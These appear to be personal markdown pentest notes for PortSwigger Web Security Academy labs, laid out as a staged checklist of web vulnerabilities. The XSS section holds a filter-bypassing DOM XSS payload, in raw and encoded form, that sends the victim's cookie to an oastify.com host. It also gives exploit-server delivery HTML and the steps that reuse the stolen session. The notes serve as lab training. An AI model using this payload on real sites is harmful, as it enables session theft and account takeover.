1. Checked boxes means that the vulnerability has been checked and is not present.
2. make space below the checkboxes to add in screenshots for proof (only successful attempts?)
# SCANNING (Enumeration)
## Focus Scanning
- use *Scan selected insertion points* after selecting values 
	- add to the same task to not have too many tasks
		- be wary that it will queue up and may take longer
## Non-Standard Data Structures Scanning
- scan cleartext only if the value has a mix of cleartext and tokens/encoding
# STAGE 1: FOOTHOLD
- [x] Content Discovery?
	- `ffuz`, `robots.txt`
- [ ] [XSS?](../notes/client-side/Cross-Site%20Scripting%20(XSS).md)
	- [ ] [](../notes/client-side/Cross-Site%20Scripting%20(XSS).md#DOM-Based%20XSS|DOM%20XXS?)
		- [ ] reflected DOM XSS : bypassing signature based filters
			- payload:
				`"-eval(atob('var i=new Image();i.src="http://h1jxn2m4xioxosa95g1bwm9dy44vsmia7.oastify.com/?cookie="+document.cookie;'))-"`
			- encoded payload:
				```
				%22-eval(atob('dmFyIGk9bmV3IEltYWdlKCk7IGkuc3JjPSJodHRwOi8vZ2N3emxvY3F2bWlrMzRxM3hpOW0xMGprN2JkMjF2cGsub2FzdGlmeS5jb20vP2Nvb2tpZT0iK2RvY3VtZW50LmNvb2tpZTs='))-%22
				```
			![Screenshot 2024-06-18 at 4.21.08 PM.png](Screenshot%202024-06-18%20at%204.21.08%20PM.png)
			- the following is received in *Collaborator*:
				![Screenshot 2024-06-18 at 6.32.38 PM.png](Screenshot%202024-06-18%20at%206.32.38%20PM.png)
			- use the following in the body of the exploit server and then deliver to victim, 
				```html 
				<script>
				document.location.href = "https://0a7e00db033481818283e7d8007000aa.web-security-academy.net/?SearchTerm=%22-eval(atob('dmFyIGk9bmV3IEltYWdlKCk7IGkuc3JjPSJodHRwOi8vZ2N3emxvY3F2bWlrMzRxM3hpOW0xMGprN2JkMjF2cGsub2FzdGlmeS5jb20vP2Nvb2tpZT0iK2RvY3VtZW50LmNvb2tpZTs='))-%22"
				</script>
				```
			- should receive their cookie
				![Screenshot 2024-06-18 at 6.38.40 PM.png](Screenshot%202024-06-18%20at%206.38.40%20PM.png)
			- open a blog post (has no csrf or any other parameters) and paste the cookie in *Repeater*. open the response in browser to log in as *carlos*:
				![Screenshot 2024-06-18 at 6.42.22 PM.png](Screenshot%202024-06-18%20at%206.42.22%20PM.png)
- [x] [Web Cache Poisoning?](../notes/advanced-topics/Web%20Cache%20Poisoning.md)
- [x] [HTTP Host Header Attack?](../notes/advanced-topics/HTTP%20Host%20Header%20Attacks.md)
- [x] [Request Smuggling?](../notes/advanced-topics/HTTP%20Request%20Smuggling.md)
- [x] [](../notes/server-side/Authentication.md#Brute-Force%20Attacks|Brute-Force%20Authentication?)
- [x] Others?
# STAGE 2: PRIVILEGE ESCALATION
- [x] [CSRF?](../notes/client-side/Cross-Site%20Request%20Forgery%20(CSRF).md)
- [x] Password Reset
	- multiple different types, check all
- [ ] [SQLi?](../notes/server-side/SQL%20Injection.md)
	- advanced search page
	- ran `sqlmap` on the blog parameter with the following command:
		``
- [x] JWT?
- [x] [Access Control?](../notes/server-side/Access%20Control.md)
- [x] [[Cross-Origin Resource Sharing (CORS)]CORS?]

# STAGE 3: DATA EXFILTRATION
- [x] [XXE?](../notes/server-side/XML%20External%20Entity%20Injection%20(XXE).md)
- [x] [SSRF?](../notes/server-side/Server-Side%20Request%20Forgery%20(SSRF).md)
- [x] [SSTI?](../notes/advanced-topics/Server-Side%20Template%20Injection%20(SSTI).md)
- [x] [Path Traversal?](../notes/server-side/Path%20Traversal.md)
- [x] [File Upload?](../notes/server-side/File%20Upload.md)
- [ ] [Insecure Deserialization?](../notes/advanced-topics/Insecure%20Deserialization.md)
- [x] [Command Injection?](../notes/server-side/OS%20Command%20Injection.md)
